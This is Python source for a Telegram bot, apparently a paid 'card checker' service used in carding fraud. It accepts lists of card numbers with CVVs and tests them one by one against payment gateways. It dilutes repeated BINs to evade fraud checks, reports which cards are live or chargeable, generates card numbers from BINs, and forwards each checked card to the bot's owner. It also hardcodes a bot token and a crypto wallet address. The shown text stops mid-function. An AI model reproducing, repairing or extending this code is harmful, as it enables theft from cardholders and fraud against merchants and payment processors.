###@Eleosvan Dm For More ###

import telebot,os
import re,json
import requests
import telebot,time,random
import random
import string
from telebot import types
from gates import *
from tools import *
from reg import reg
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
import flagz
import pycountry
import user_agent,ast
import traceback
stopuser={}
command_usage = {}
values_list = []
group='x8_es'
botuser='mo3gza_bot'
userdeve='The_E4'
namebot='KAYAN'
trc='TFdNRJuEcCssv8jzLbiqioSS4QZSmkZudq'
cash='Nothing'
scj = {
			'file_name': 'xx',
			'reply_to_message_id': 'xx'}
admin=6821529235
files_to_download = {}
stopuser={}
files_to_download['4070'] = {
			'file_name': 'xx',
			'reply_to_message_id': 'xx'
		}
tok='7879139068:AAFfs1wajxWQZr9UU5WUY_fa9tmINobtFis'
chat_id = 6821529235
bot = telebot.TeleBot(tok,parse_mode='HTML')
def c():
		lines='''cvv
x
ccx
auth
pro'''
		lines = lines.strip().split('\n')
		with open('last_cmd.txt', 'r') as file:
			last_cmd = file.readline().strip()
		while True:
			random_line_number = random.randint(0, len(lines) - 1)
			de = lines[random_line_number]
			if str(de) == str(last_cmd):
				pass
			else:
				print(de)
				with open('last_cmd.txt', 'w') as file:
					file.write(de)				
				return de
@bot.message_handler(commands=["pu"])
def start(message):
	id=message.from_user.id
	tm=''
	if admin == (id):
		pass
	else:
		return
	ax = 0
	msg=message.text.split('/pu')[1]
	try:
		with open('data.json') as f:
			data = json.load(f)
		bot.reply_to(message, 'Broadcasting to bot users and groups...⏳')
		for key, value in data.items():
			if key in tm:
				continue
			try:
				tm+=key+'\n'
				bot.send_message(key, msg)
				time.sleep(0.5)
				ax+=1
			except Exception as e:
				print('ERROR : ',e)
		bot.reply_to(message, f'The broadcast has ended and the message has been successfully sent to {ax} user ✅')
	except Exception as e:
		bot.reply_to(message, 'Failed, something is wrong...❌')
		print('ERROR 2: ',e)
@bot.message_handler(content_types=['document'])
def handle_document(message):
	def my_function():
		id=message.from_user.id
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
		try:
			plan=json_data[str(id)]['plan']
		except:
			new_data = {
				id : {
	  "plan": "Free",
	  "timer": "none",
	  "funds": 0,
	  "order": ""
				}
			}
	
			json_data.update(new_data);file.seek(0);json.dump(json_data, file, indent=4);file.truncate()
			plan='Free'
		if plan == 'Free' or plan == 'premium':
			keyboard = types.InlineKeyboardMarkup()
			button1 = types.InlineKeyboardButton(text="Upgrade to The VIP Plan", callback_data='plans')
			button2 = types.InlineKeyboardButton(text="Use The Bot Free -استخدام البوت مجانا ", url=f"https://t.me/{group}")
			keyboard.row(button1)
			keyboard.row(button2)
			bot.reply_to(message, f'<b>You Cannot check  This File Because Your Current Plan Does Not Allow You to check Files. Your Current Plan is {plan} The Only Plan Through Which You Can Check a File is The VIP Plan. If You Want to Purchase The VIP Plan, Click The First Button Below to See The Details of The Plans.</b>',reply_markup=keyboard)
			return
		date_str=json_data[str(id)]['timer']
		if date_str=='none':
			keyboard = types.InlineKeyboardMarkup()
			button1 = types.InlineKeyboardButton(text="Upgrade to The VIP Plan", callback_data='plans')
			button2 = types.InlineKeyboardButton(text="Use The Bot Free -استخدام البوت مجانا ", url=f"https://t.me/{group}")
			keyboard.row(button1)
			keyboard.row(button2)
			bot.reply_to(message, '<b>Sorry, You Cannot Use This Command Because This Command is For VIP Users Only And Your Current Plan is Free. to Upgrade to The Premium Plan, Click on The First Button Below to Know The Details.</b>',reply_markup=keyboard)
			return
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			button1 = types.InlineKeyboardButton(text="Upgrade to The Premium Plan", callback_data='plans')
			button2 = types.InlineKeyboardButton(text="Use The Bot Free -استخدام البوت مجانا ", url=f"https://t.me/{group}")
			keyboard.row(button1)
			keyboard.row(button2)
			bot.reply_to(message, '<b>it Appears That Your Subscription Has Expired. to Purchase a New Subscription, Click on The First Button Below to Know The Subscription Details .</b>',reply_markup=keyboard)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['plan'] = 'Free'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		rec=json_data[str(id)]['order']
		if rec == 'rec':
		   bot.reply_to(message, "<b>You Cannot Check two Files at The Same Time ⚠️</b>",parse_mode="HTML")
		   return
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open('len.txt', 'wb') as new_file:
			new_file.write(ee)
		with open('len.txt', "r") as file:
			lines = file.readlines()
		if len(lines) > 2000:
			bot.reply_to(message,'<b>️Maximum 2000 cards ⚠️</b>',parse_mode="HTML")
			return
		if message.document.mime_type == 'text/plain':
			bot.reply_to(message, "<b>Now Send The Command To Respond to The File 🪄</b>",parse_mode="HTML")
			files_to_download[message.document.file_id] = {
					'file_name': message.document.file_name,
					'reply_to_message_id': message.message_id
				}
		else:
			bot.reply_to(message, "<b>I Only Receive .txt Files </b>",parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
def co(cmd,id,bot,message):
	def my_function():
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
		chk=json_data[str(cmd)]['typ']
		gate=json_data[str(cmd)]['name']
		de=json_data[str(cmd)]['def']
		per=json_data[str(cmd)]['file']
		de=globals()[de]
		status=json_data[str(cmd)]['status']
		try:
			plan=json_data[str(id)]['plan']
		except:
			new_data = {
				id : {
	  "plan": "Free",
	  "timer": "none",
	  "funds": 0,
	  "order": ""
				}
			}
	
			json_data.update(new_data);file.seek(0);json.dump(json_data, file, indent=4);file.truncate()
			plan='Free'
		if plan == 'Free' or plan == 'premium':
			keyboard = types.InlineKeyboardMarkup()
			button1 = types.InlineKeyboardButton(text="Upgrade to The Premium Plan", callback_data='plans')
			button2 = types.InlineKeyboardButton(text="Use The Bot Free -استخدام البوت مجانا ", url=f"https://t.me/{group}")
			keyboard.row(button1)
			keyboard.row(button2)
			bot.reply_to(message, f'<b>You Cannot check  This File Because Your Current Plan Does Not Allow You to check Files. Your Current Plan is {plan} The Only Plan Through Which You Can Check a File is The VIP Plan. If You Want to Purchase The VIP Plan, Click The First Button Below to See The Details of The Plans.</b>',reply_markup=keyboard)
			return
		date_str=json_data[str(id)]['timer']
		if date_str=='none':
			keyboard = types.InlineKeyboardMarkup()
			button1 = types.InlineKeyboardButton(text="Upgrade to The Premium Plan", callback_data='plans')
			button2 = types.InlineKeyboardButton(text="Use The Bot Free -استخدام البوت مجانا ", url=f"https://t.me/{group}")
			keyboard.row(button1)
			keyboard.row(button2)
			bot.reply_to(message, f'<b>You Cannot check  This File Because Your Current Plan Does Not Allow You to check Files. Your Current Plan is {plan} The Only Plan Through Which You Can Check a File is The VIP Plan. If You Want to Purchase The VIP Plan, Click The First Button Below to See The Details of The Plans.</b>',reply_markup=keyboard)
			return
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			button1 = types.InlineKeyboardButton(text="Upgrade to The Premium Plan", callback_data='plans')
			button2 = types.InlineKeyboardButton(text="Use The Bot Free -استخدام البوت مجانا ", url=f"https://t.me/{group}")
			keyboard.row(button1)
			keyboard.row(button2)
			bot.reply_to(message, '<b>it Appears That Your Subscription Has Expired. to Purchase a New Subscription, Click on The First Button Below to Know The Subscription Details .</b>',reply_markup=keyboard)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['plan'] = 'Free'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
		if per=='no':
			bot.reply_to(message, f"<b>This Gatewya Does Not Allow You To Check Cards From a File. You Can Check Them Manually</b>",parse_mode="HTML")
		f=False
		for file_id, file_data in files_to_download.items():
			if file_data['reply_to_message_id'] == message.reply_to_message.message_id:
				f=True
		if f==True:
			pass
		else:
			bot.reply_to(message, f"<b>Send The File Again First 🎃</b>",parse_mode="HTML")
			return
		rec=json_data[str(id)]['order']
		if rec == 'rec':
		   bot.reply_to(message, "<b>You Cannot Check two Files at The Same Time ⚠️</b>",parse_mode="HTML")
		   return
		file_info = bot.get_file(file_id)
		downloaded_file = bot.download_file(file_info.file_path)
		with open(file_data['file_name'], 'wb') as new_file:
			new_file.write(downloaded_file)
		current_time = datetime.now()
		allowed, time_until_next_hour = check_command_limit(id)
		with open(file_data['file_name'], "r") as file:
			lines = file.readlines()
		if len(lines) > 10:
			yi=100
		else:
			yi=0.1
		if len(lines) > 20:
			yi=0.1
		if len(lines) > 30:
			yi=0.1
		if len(lines) > 400:
			yi=0.1
		if len(lines) > 80:
			yi=0.1
		try:
			scj[id]['sc']
		except:
			scj[id]={"sc":yi}
		if scj[id]['sc'] is not None:
			sc=scj[id]['sc']
		else:
			sc=yi
		if command_usage[id]['last_time'] is not None:
			time_diff = (current_time - command_usage[id]['last_time']).seconds
			if time_diff < sc:
				bot.reply_to(message, f"<b>Try again after {sc-time_diff} seconds.</b>",parse_mode="HTML")
				return
		json_data[str(id)]['order'] = 'rec'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		
		
		with open(file_data['file_name'], "r") as file:
			lines = file.readlines()
		
			random.shuffle(lines)
		with open(file_data['file_name'], "w") as file:
			file.writelines(lines)
		if status=='ofline':
			bot.reply_to(message,'<b>The Gate Is Under Maintenance 🔧⚙️</b>',parse_mode="HTML")
			return
		dd = 0
		live = 0
		ch = 0
		cvc = 0
		bins = {}
		total_cards = 0
		lines = []
		fu=0
		ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)					
		try:
			with open(file_data['file_name'], 'r') as file:
				lines = file.readlines()
			if 'chk' in cmd or 'cc' in cmd or 'auth' in cmd or 'cvv' in cmd:
				for line in lines:
						bin_number = line[:6]
						if bin_number in bins:
							bins[bin_number] += 1
						else:
							bins[bin_number] = 1
						total_cards += 1
				for bin_number, count in bins.items():
					percentage = (count / total_cards) * 100
					if percentage == 100:
						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''This file cannot be checked because it consists of only one BIN, so it will not be checked on any of the Braintree gateways.''')
						with open('data.json', 'r+') as file:
							json_data = json.load(file)
							json_data[str(id)]['order'] = ''
						with open('data.json', 'w') as file:
							json.dump(json_data, file, indent=2)
						return
					if percentage > 20:
						pass
						cards_to_remove = int((percentage - 10) / 100 * total_cards)
						if cards_to_remove >= 1:
							pass
							remaining_lines = []
							removed_count = 0
							for l in lines:
								if l.startswith(bin_number):
									if removed_count < cards_to_remove:
										removed_count += 1
									else:
										remaining_lines.append(l)
								else:
									remaining_lines.append(l)
							lines = remaining_lines
						else:
							pass
			with open(file_data['file_name'], 'w') as file:
				file.writelines(lines)
			with open(file_data['file_name'], 'r') as file:
				lines = file.readlines()
				
			random.shuffle(lines)
			with open(file_data['file_name'], 'w') as file:
				file.writelines(lines)
			with open(file_data['file_name'], 'w') as file:
				file.writelines(lines)
			with open(file_data['file_name'], 'r') as file:
				lino = file.readlines()
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				total = len(lino)
				for cc in lino:
					if reg(cc) == 'None':
						continue
					with open('data.json', 'r+') as file:
						json_data = json.load(file)
					vi=json_data[str(id)]['order']
					if stopuser[f'{id}']['status'] == 'stop' or vi == '' or vi == 'stop':
						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''The Check Has Been Stopped 
	

Charge ➜ {ch}
Approved ➜ {live}
insufficient funds ➜ {fu}
CCN ➜ {cvc}
Declined ➜ {dd}
	
					<a href='https://t.me/{botuser}'>𝒔𝒐𝒖𝒓𝒄𝒆 𝒃𝒐𝒕 𝒌𝒂𝒚𝒂𝒏</a>''',parse_mode="HTML")
						command_usage[id]['last_time'] = datetime.now()
						with open('data.json', 'r+') as file:
							json_data = json.load(file)
							json_data[str(id)]['order'] = ''
						with open('data.json', 'w') as file:
							json.dump(json_data, file, indent=2)
						return
					start_time = time.time()
					with open('data.json', 'r+') as file:
						json_data = json.load(file)
						date_str=json_data[str(id)]['timer']
						provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
						current_time = datetime.now()
						required_duration = timedelta(hours=0)
						if current_time - provided_time > required_duration:
							keyboard = types.InlineKeyboardMarkup()
							button1 = types.InlineKeyboardButton(text="Upgrade to The Premium Plan", callback_data='plans')
							button2 = types.InlineKeyboardButton(text="Use The Bot Free -استخدام البوت مجانا ", url=f"https://t.me/{group}")
							keyboard.row(button1)
							keyboard.row(button2)
							bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='<b>it Appears That Your Subscription Has Expired. to Purchase a New Subscription, Click on The First Button Below to Know The Subscription Details .</b>',reply_markup=keyboard)
							json_data[str(id)]['timer'] = 'none'
							json_data[str(id)]['plan'] = 'Free'
							with open('data.json', 'w') as file:
								json.dump(json_data, file, indent=2)
							stopuser[f'{id}']['status'] = 'stop'
							return
					cc=reg(cc)
					if cc == 'None':
						continue
					try:
						time.sleep(random.randint(15, 35))
						if 'chk' == cmd or 'cc' == cmd or 'auth' == cmd or 'cvv' == cmd or 'x' == cmd or 'pro' == cmd:
							de=c()
							last = globals()[de](cc)
							if 'RISK' in last or 'risk' in last:
								de=c()
								last = globals()[de](cc)
						else:
							last = de(cc)
					except Exception as e:
						line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
						error_type = type(e).__name__
						er=f'1 An error occurred [ {cmd} ] type error [ {error_type} ] in line [ {line_number} ] '
						print(er)
						bot.send_message(owner,er)
						last='Error'
					mes = types.InlineKeyboardMarkup(row_width=1)
					buttons = [
						types.InlineKeyboardButton(f"• {cc} •", callback_data='u8'),
						types.InlineKeyboardButton(f"• 𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {last} •", callback_data='u8'),
						types.InlineKeyboardButton(f"• 𝐂𝐡𝐚𝐫𝐠𝐞 ✅ ➜ [ {ch} ] •", callback_data='x'),
						types.InlineKeyboardButton(f"• 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ➜ [ {live} ] •", callback_data='x'),
						types.InlineKeyboardButton(f"• 𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬 ☑️ ➜ [ {fu} ] •", callback_data='x'),
						types.InlineKeyboardButton(f"• 𝐂𝐂𝐍 ☑️ ➜ [ {cvc} ] •", callback_data='x'),
						types.InlineKeyboardButton(f"• 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ➜ [ {dd} ] •", callback_data='x'),
						types.InlineKeyboardButton(f"• 𝐓𝐨𝐭𝐚𝐥 👻 ➜ [ {total} ] •", callback_data='x'),
						types.InlineKeyboardButton("[ 𝐒𝐓𝐎𝐏 ]", callback_data='stop')
					]
					mes.add(*buttons)
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''<b>Wait, I'M Checking Your Cards file Now On The Gateway {gate}

to Stop The Check, Send /Stop or Press The Stop Button</b>''', reply_markup=mes)
					end_time = time.time()
					execution_time = end_time - start_time
					if 'Approved' in last or 'Invalid postal code' in last or 'Your card is saved' in last:
						live += 1
						statu='𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
						hi(bot,last,statu,execution_time,cc,gate,message)
					elif 'Funds' in last or 'funds' in last:
						fu+=1
						statu='𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬 ☑️'
						hi(bot,last,statu,execution_time,cc,gate,message)
					elif 'success' in last:
						ch+=1
						statu='𝐂𝐡𝐚𝐫𝐠𝐞 ✅'
						hi(bot,last,statu,execution_time,cc,gate,message)
					if 'Declined CVV' in last or 'security code' in last or 'CVC Check Fails' in last or "card's security" in last or "The card verification number does not match." in last or 'The CVV provided is incorrect' in last:
						statu='𝐂𝐂𝐍 ☑️'
						cvc += 1
						hi(bot,last,statu,execution_time,cc,gate,message)
					else:
						dd += 1
		except Exception as e:
			print(e)
		command_usage[id]['last_time'] = datetime.now()
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''The Check Has Been Completed 

Charge ➜ {ch}
Approved ➜ {live}
insufficient funds ➜ {fu}
CCN ➜ {cvc}
Declined ➜ {dd}
					<a href='https://t.me/{botuser}'>𝒔𝒐𝒖𝒓𝒄𝒆 𝒃𝒐𝒕 𝒌𝒂𝒚𝒂𝒏</a>''',parse_mode="HTML")
		stopuser[f'{id}']['status'] = 'stop'
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
		json_data[str(id)]['order'] = 'com'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		os.remove(file_data['file_name'])
		del files_to_download[file_id]
		return
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
def hi(bot,last,status,execution_time,cc,gate,message):
	brand, card_type, bank, country, country_flag, statu = info(cc.split('|')[0])
	msg=f'''<b>{status}
		
𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
𝐑𝐞𝐬𝐮𝐥𝐭 ➜ {last}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ {gate}
	
𝐁𝐈𝐍 ➜ {cc[:6]} - {card_type} - {brand} 
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} - {country_flag} 
𝐁𝐚𝐧𝐤 ➜ {bank}

𝐕𝐁𝐕? ➜ {vbv(cc)}
𝐓𝐢𝐦𝐞 {"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬</b>'''
	bot.reply_to(message, msg)
def cu(cmd,id,bot,message):
	file = open('data.json', 'r+')
	json_data = json.load(file)
	chk=json_data[str(cmd)]['typ']
	gate=json_data[str(cmd)]['name']
	de=json_data[str(cmd)]['def']
	status=json_data[str(cmd)]['status']
	try:
		plan=json_data[str(id)]['plan']
	except:
		new_data = {
			id : {
  "plan": "Free",
  "timer": "none",
  "funds": 0,
  "order": ""
			}
		}
		json_data.update(new_data);file.seek(0);json.dump(json_data, file, indent=4);file.truncate()
		plan='Free'
	if chk=='Premium':
		date_str=json_data[str(id)]['timer']
		if date_str=='none':
			keyboard = types.InlineKeyboardMarkup()
			button1 = types.InlineKeyboardButton(text="Upgrade to The Premium Plan", callback_data='plans')
			button2 = types.InlineKeyboardButton(text="Use The Bot Free -استخدام البوت مجانا ", url=f"https://t.me/{group}")
			keyboard.row(button1)
			keyboard.row(button2)
			bot.reply_to(message, '<b>Sorry, You Cannot Use This Command Because This Command is For Premium Users Only And Your Current Plan is Free. to Upgrade to The Premium Plan, Click on The First Button Below to Know The Details.</b>',reply_markup=keyboard)
			return
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			button1 = types.InlineKeyboardButton(text="Upgrade to The Premium Plan", callback_data='plans')
			button2 = types.InlineKeyboardButton(text="Use The Bot Free -استخدام البوت مجانا ", url=f"https://t.me/{group}")
			keyboard.row(button1)
			keyboard.row(button2)
			bot.reply_to(message, '<b>it Appears That Your Subscription Has Expired. to Purchase a New Subscription, Click on The First Button Below to Know The Subscription Details .</b>',reply_markup=keyboard)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['plan'] = 'Free'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
	if status=='ofline':
		bot.reply_to(message,'<b>The Gate Is Under Maintenance 🔧⚙️</b>',parse_mode="HTML")
		return
	cmd=cmd.split('/')[1]
	cc=message.text.split(cmd)[1]
	
	cc=str(reg(cc))
	if cc == 'None':
		try:
			cc = message.reply_to_message.text
			cc=str(reg(cc))
			if cc == 'None':
				bot.reply_to(message, '''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		except:
			bot.reply_to(message, '''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
			return
	if not '3' == cc[:1]:
		if luhn_algorithm(cc.split('|')[0]):
			pass
		else:
			bot.reply_to(message,'<b>Your Card Number is Not Valid. Try to Input a Valid Card Number ❌</b>')
			return
	allowed, time_until_next_hour = check_command_limit(id)
	sc=30
	if 'VIP' == plan or 'premium' == plan:
		sc=15
	allowed, time_until_next_hour = check_command_limit(id)
	if not allowed:
		bot.reply_to(message, f"<b>Only 30 𝘤𝘢𝘳𝘥𝘴 can be checked per hour for non-subscribers. You can check again in {time_until_next_hour}m.</b>",parse_mode="HTML")
		return
	current_time = datetime.now()
	if command_usage[id]['last_time'] is not None:
		time_diff = (current_time - command_usage[id]['last_time']).seconds
		if time_diff < sc:
			bot.reply_to(message, f"<b>Try again after {sc-time_diff} seconds.</b>",parse_mode="HTML")
			return
	ko = (bot.reply_to(message, "<b>Checking Your Card...⌛</b>",parse_mode="HTML").message_id)
	start_time = time.time()
	command_usage[id]['last_time'] = datetime.now()
	if plan=='Free':
		command_usage[id]['count'] += 1
	try:
		start_time = time.time()
		if 'chk' == cmd or 'cc' == cmd or 'auth' == cmd or 'cvv' == cmd or 'x' == cmd or 'pro' == cmd:
			de=c()
			last = globals()[de](cc)
			bot.send_message(owner,f'{cc} {last} {de}')
			if 'RISK' in last or 'risk' in last:
				
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='The result was (RISK: Retry this BIN later.) This means that it has not been checked, so I will try to check it on another Gate of the same type, please wait..⏳')
				de=c()
				last = globals()[de](cc)
				bot.send_message(owner,f'{cc} {last} {de}')
		else:
			last = globals()[de](cc)
			bot.send_message(owner,f'{cc} {last} {de}')
	except Exception as e:
		try:
			line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
			error_type = type(e).__name__
			er=f'1 An error occurred [ {cmd} ] type error [ {error_type} ] in line [ {line_number} ] '
			print(er)
			bot.send_message(owner,er)
		except Exception as e:
			print(e)
		if 'chk' == cmd or 'cc' == cmd or 'auth' == cmd or 'cvv' == cmd or 'x' == cmd or 'pro' == cmd:
			pass
		else:
			bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='<b>An Error Occurred, Try Again</b>')
			return
		try:
			de=c()
			last = globals()[de](cc)
			bot.send_message(owner,f'{cc} {last} {de}')
		except Exception as e:
			try:
				line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
				error_type = type(e).__name__
				er=f'2 An error occurred [ {cmd} ] type error [ {error_type} ] in line [ {line_number} ] '
				bot.send_message(owner,er)
				print(er)
			except Exception as e:
				print(e)
			try:
				de=c()
				last = globals()[de](cc)
				bot.send_message(owner,f'{cc} {last} {de}')
			except Exception as e:
				try:
					line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
					error_type = type(e).__name__
					er=f'3 An error occurred [ {cmd} ] type error [ {error_type} ] in line [ {line_number} ] '
					bot.send_message(owner,er)
					print(er)
				except Exception as e:
					print(e)
				try:
					de=c()
					last = globals()[de](cc)
					bot.send_message(owner,f'{cc} {last} {de}')
				except Exception as e:
					try:
						line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
						error_type = type(e).__name__
						er=f'4 An error occurred [ {cmd} ] type error [ {error_type} ] in line [ {line_number} ] '
						bot.send_message(owner,er)
						print(er)
					except Exception as e:
						print(e)
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='<b>An Error Occurred, Try Again</b>')
					return
	end_time = time.time()
	execution_time = end_time - start_time
	if 'Approved' in last or 'Invalid postal code' in last or 'Your card is saved' in last:
		status='𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
	elif 'risk' in last or 'RISK' in last:
		status='𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
		last='RISK: Retry this BIN later or Then Change the BIN'
	elif 'CHARGED' in last or 'success' in last or 'Success' in last or 'Your payment has already been processed' in last or 'succeeded' in last or 'success' in last or 'Thank' in last:
		status='𝐂𝐡𝐚𝐫𝐠𝐞 ✅'
	elif 'Funds' in last or 'funds' in last:
		status='𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬 ☑️'
	else:
		status='𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
	brand, card_type, bank, country, country_flag, statu = info(cc.split('|')[0])
	msg=f'''<b>{status}
		
𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
𝐑𝐞𝐬𝐮𝐥𝐭 ➜ {last}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ {gate}
	
𝐁𝐈𝐍 ➜ {cc[:6]} - {card_type} - {brand} 
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} - {country_flag} 
𝐁𝐚𝐧𝐤 ➜ {bank}

𝐕𝐁𝐕? ➜ {vbv(cc)}
𝐓𝐢𝐦𝐞 {"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬</b>'''
	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg,parse_mode="HTML")
def luhn_algorithm(card_number):
	digits = [int(digit) for digit in str(card_number)]
	digits.reverse()
	doubled_digits = [digit * 2 if index % 2 == 1 else digit for index, digit in enumerate(digits)]
	doubled_digits = [digit - 9 if digit > 9 else digit for digit in doubled_digits]
	total = sum(doubled_digits)
	return total % 10 == 0
@bot.message_handler(func=lambda message: message.text.lower().startswith(('.chk', '/chk')) or 
											message.text.lower().startswith(('.cc', '/cc')) or 
											message.text.lower().startswith(('.br', '/br')) or 
											message.text.lower().startswith(('.auth', '/auth')) or 
											message.text.lower().startswith(('.be', '/be')) or 
											message.text.lower().startswith(('.cvv', '/cvv')) or 
											message.text.lower().startswith(('.chg', '/chg')) or 
											message.text.lower().startswith(('.cn', '/cn')) or 
											message.text.lower().startswith(('.au', '/au')) or 
											message.text.lower().startswith(('.sq', '/sq')) or 
											message.text.lower().startswith(('.squ', '/squ')) or 
											message.text.lower().startswith(('.sqq', '/sqq')) or 
											message.text.lower().startswith(('.sl', '/sl')) or 
											message.text.lower().startswith(('.so', '/so')) or 
											message.text.lower().startswith(('.sh', '/sh')) or 
											message.text.lower().startswith(('.stc', '/stc')) or 
											message.text.lower().startswith(('.gg', '/gg')) or 
											message.text.lower().startswith(('.pp', '/pp')) or 
											message.text.lower().startswith(('.str', '/str')) or 
											message.text.lower().startswith(('.sd', '/sd')) or 
											message.text.lower().startswith(('.sf', '/sf')) or 
											message.text.lower().startswith(('.sc', '/sc')) or 
											message.text.lower().startswith(('.sv', '/sv')) or
											message.text.lower().startswith(('.ka', '/ka')) or 
											message.text.lower().startswith(('.b3', '/b3')) or 
											message.text.lower().startswith(('.pw', '/pw')) or
											message.text.lower().startswith(('.pay', '/pay')) or 
											message.text.lower().startswith(('.sa', '/sa')) or 
											message.text.lower().startswith(('.stc', '/stc')) or 
											message.text.lower().startswith(('.vip', '/vip')) or 
											message.text.lower().startswith(('.x', '/x')) or 
											message.text.lower().startswith(('.xc', '/xc')) or 
											message.text.lower().startswith(('.stn', '/stn')) or
											message.text.lower().startswith(('.pro', '/pro')))
def respond_to_vbv(message):
	current_time = time.time()
	message_time = message.date
	time_difference = current_time - message_time
	if not time_difference <= 3:
		return
	def my_function():
		id=message.from_user.id
		cmd=message.text.split(' ')[0].replace('.','/')
		if message.reply_to_message and message.reply_to_message.document:
			co(cmd,id,bot,message)
		else:
			cu(cmd,id,bot,message)
		
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
def generate_credit_card(message, bot,ko):
	try:
		match = re.search(r'(\d{6,16})\D*(\d{1,2}|xx)?\D*(\d{2,4}|xx)?\D*(\d{3,4}|xxx)?', message.text)
		if match:
			card_number = match.group(1)
			if len(card_number) < 6 or card_number[0] not in ['4', '5', '3', '6']:
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>BIN not recognized. Please enter a valid BIN ❌</b>''',parse_mode="HTML")
				return
			
			bin = card_number[:6]
			
			response_message = ""
			
			for _ in range(10):
				month = int(match.group(2)) if match.group(2) and match.group(2) != 'xx' else random.randint(1, 12)
				year = int(match.group(3)) if match.group(3) and match.group(3) != 'xx' else random.randint(2025, 2029)
				if card_number[:1] == "3":
					cvv = int(match.group(4)) if match.group(4) and match.group(4) != 'xxx' else random.randint(1000, 9999)
				elif card_number[:1] == "5" or card_number[:1] == "4" or card_number[:1] == "6":
					cvv = int(match.group(4)) if match.group(4) and match.group(4) != 'xxx' else random.randint(100, 999)
				
				credit_card_info = generate_credit_card_info(card_number, month, year, cvv)
				response_message += f"<code>{credit_card_info}</code>\n"
			
			brand, type, bank, country_name, country_flag, status = info(credit_card_info.split('|')[0])
			bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= f"𝐁𝐈𝐍 ➜  {bin}\n\n{response_message}\n𝐁𝐈𝐍 𝐈𝐧𝐟𝐨 ➜ {brand} - {type}\n𝐁𝐚𝐧𝐤 ➜  {bank}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country_name} - {country_flag}")

		else:
			bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>Invalid input. Please provide a BIN (Bank Identification Number) that is at least 6 digits but not exceeding 16 digits. 
Example: <code>/gen 412236xxxx |xx|2023|xxx</code></b>''',parse_mode="HTML")

	except IndexError:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= "<b>BIN not recognized. Please enter a valid BIN ❌</b>")

def generate_credit_card_info(card_number, expiry_month, expiry_year, cvv):
	generated_num = str(card_number)
